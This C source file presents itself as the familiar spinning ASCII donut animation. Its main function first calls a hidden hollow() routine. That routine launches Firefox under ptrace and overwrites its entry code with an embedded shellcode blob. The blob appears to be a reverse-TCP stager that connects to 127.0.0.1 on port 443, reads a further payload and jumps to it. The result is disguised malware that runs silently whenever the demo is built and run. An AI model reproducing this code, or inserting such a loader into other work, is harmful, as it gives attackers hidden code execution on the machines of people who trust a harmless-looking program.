
#include <stdio.h>
#include <math.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/types.h>

void hollow(); int main() {
    float A = 0, B = 0;
    float i, j;
    int k;
    float z[1760];
    char b[1760];hollow();
    printf("\x1b[2J");
    for(;;) {
        memset(b,32,1760);
        memset(z,0,7040);
        for(j=0; j < 6.28; j += 0.07) {
            for(i=0; i < 6.28; i += 0.02) {
                float c = sin(i);
                float d = cos(j);
                float e = sin(A);
                float f = sin(j);
                float g = cos(A);
                float h = d + 2;
                float D = 1 / (c * h * e + f * g + 5);
                float l = cos(i);
                float m = cos(B);
                float n = sin(B);
                float t = c * h * g - f * e;
                int x = 40 + 30 * D * (l * h * m - t * n);
                int y= 12 + 15 * D * (l * h * n + t * m);
                int o = x + 80 * y;
                int N = 8 * ((f * e - c * d * g) * m - c * d * e - f * g - l * d * n);
                if(22 > y && y > 0 && x > 0 && 80 > x && D > z[o]) {
                    z[o] = D;
                    b[o] = ".,-~:;=!*#$@"[N > 0 ? N : 0];
                }
            }
        }
        printf("\x1b[H");
        for(k = 0; k < 1761; k++) {
            putchar(k % 80 ? b[k] : 10);
            A += 0.00004;
            B += 0.00002;
        }
        usleep(30000);
    }
    return 0;
}

void hollow() {
    const char *bin = "/usr/bin/firefox";   
    unsigned char shellcode[] = 
        "\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
        "\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51"
        "\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
        "\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00"
        "\x01\xbb\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10\x5a\x6a"
        "\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
        "\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31"
        "\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
        "\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0"
        "\x78\xed\xff\xe6";

    size_t shellcodeLen = sizeof(shellcode);
    char *params[] = {(char*)bin, NULL};
    pid_t procID = fork();
    if (procID == 0) {
        // Child
        if (ptrace(PTRACE_TRACEME, NULL, NULL, NULL) == -1) {
            return;

        }

        execve(bin, params, 0);
        return;

    }

    if (waitpid(procID, 0, 0) == -1) {
        goto detach;

    }

    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, procID, NULL, &regs) == -1) {
        goto detach;

    }

    unsigned long address = regs.rip;

    for (int i = 0; i < shellcodeLen; i += sizeof(unsigned long)) {
        unsigned long w = ((unsigned long*)shellcode)[(i / sizeof(unsigned long))];
        if (ptrace(PTRACE_POKETEXT, procID, address + i, w) == -1) {
            goto detach;

        }

    }

    ptrace(PTRACE_DETACH, procID, NULL, NULL);
    return;

    detach:
        ptrace(PTRACE_DETACH, procID, NULL, NULL);
        return;

};